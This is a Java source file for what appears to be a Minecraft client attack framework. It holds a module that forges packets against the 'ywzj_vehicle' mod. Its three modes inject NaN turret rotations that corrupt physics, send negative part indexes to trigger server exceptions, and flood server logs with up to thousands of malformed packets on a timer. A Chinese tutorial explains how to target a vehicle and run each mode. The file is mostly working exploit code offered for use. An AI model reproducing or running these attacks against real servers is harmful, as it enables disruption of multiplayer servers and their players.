package com.redblue.red.modules.limitlessvehicle;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * LV-09 + LV-10: Negative index crash + NaN turret rotation injection.
 *
 * LV-09 (CONFIRMED): PartUnit.onClientMessageReceived checks
 *   partUnitIndex < partUnits.size() but NOT >= 0.
 *   Negative index -> IndexOutOfBoundsException in List.get().
 *   Same for weaponIndex in WeaponUnit.shoot().
 *   Exception swallowed by enqueueWork CompletableFuture.
 *
 * LV-10 (CONFIRMED): When shoot=false, handler directly writes
 *   client xAimRot/yAimRot to RotatableUnit with no validation.
 *   NaN/Infinity values propagate through physics calculations.
 *
 * Wire format (index 101, aim branch):
 *   writeByte(101)
 *   writeInt(vehicleEntityId)
 *   writeBoolean(false)  // leaveVehicle
 *   writeBoolean(false)  // toggleEngine
 *   writeBoolean(false)  // lockEntity
 *   writeInt(partUnitIndex)
 *   writeBoolean(false)  // shoot=false -> aim branch
 *   writeFloat(xAimRot)
 *   writeFloat(yAimRot)
 */
public class LV06_TurretAbuse implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("ywzj_vehicle", "ywzj_vehicle_channel");
    private static final int IDX_VEHICLE_ACTION = 101;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofEnum("mode", "攻击模式", "NAN_INJECT",
                "NAN_INJECT", "NEGATIVE_INDEX", "LOG_FLOOD"),
        ConfigParam.ofEntity("vehicle_id", "目标载具"),
        ConfigParam.ofInt("part_index", "部件索引", 0, 0, 15)
                .visibleWhen("mode", "NAN_INJECT"),
        ConfigParam.ofInt("flood_count", "日志洪水次数", 100, 1, 10000)
                .visibleWhen("mode", "LOG_FLOOD"),
        ConfigParam.ofInt("interval", "自动间隔(tick)", 5, 1, 200)
    );

    private long lastTick = 0;

    @Override public String id() { return "lv06_turret_abuse"; }
    @Override public String name() { return "炮塔滥用"; }
    @Override public String description() {
        return "NaN注入炮塔旋转/负数索引异常/日志洪水";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 用准星选取按钮对准目标载具\n"
            + "2. 选择攻击模式:\n"
            + "   NAN_INJECT - 注入NaN旋转角度，破坏炮塔物理计算\n"
            + "   NEGATIVE_INDEX - 发送负数partUnitIndex触发异常\n"
            + "   LOG_FLOOD - 高频发送负数索引产生大量错误日志\n"
            + "3. 点击执行\n\n"
            + "[漏洞原理]\n"
            + "LV-09: partUnitIndex只检查上界，负数导致IOOBE\n"
            + "LV-10: xAimRot/yAimRot无范围校验，NaN传播破坏物理";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("ywzj_vehicle");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        doAttack(mc);
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        int interval = getParam("interval").map(ConfigParam::getInt).orElse(5);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        doAttack(mc);
    }

    private void doAttack(Minecraft mc) {
        String mode = getParam("mode").map(ConfigParam::getString).orElse("NAN_INJECT");
        int vehicleId = getParam("vehicle_id").map(ConfigParam::getInt).orElse(0);
        if (vehicleId == 0) return;

        switch (mode) {
            case "NAN_INJECT" -> sendNaN(vehicleId);
            case "NEGATIVE_INDEX" -> sendNegativeIndex(vehicleId);
            case "LOG_FLOOD" -> sendLogFlood(vehicleId);
        }
    }

    /** LV-10: Inject NaN into turret rotation */
    private void sendNaN(int vehicleId) {
        int partIdx = getParam("part_index").map(ConfigParam::getInt).orElse(0);
        sendAimPacket(vehicleId, partIdx, Float.NaN, Float.NaN);
    }

    /** LV-09: Negative partUnitIndex triggers IOOBE */
    private void sendNegativeIndex(int vehicleId) {
        sendAimPacket(vehicleId, -1, 0f, 0f);
    }

    /** LV-09: Rapid negative index packets for log flooding */
    private void sendLogFlood(int vehicleId) {
        int count = getParam("flood_count").map(ConfigParam::getInt).orElse(100);
        for (int i = 0; i < count; i++) {
            sendAimPacket(vehicleId, -1, 0f, 0f);
        }
    }

    private void sendAimPacket(int vehicleId, int partIdx,
                               float xAimRot, float yAimRot) {
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_VEHICLE_ACTION);
            buf.writeInt(vehicleId);
            buf.writeBoolean(false); // leaveVehicle
            buf.writeBoolean(false); // toggleEngine
            buf.writeBoolean(false); // lockEntity
            buf.writeInt(partIdx);   // partUnitIndex
            buf.writeBoolean(false); // shoot=false -> aim branch
            buf.writeFloat(xAimRot);
            buf.writeFloat(yAimRot);
        });
    }
}
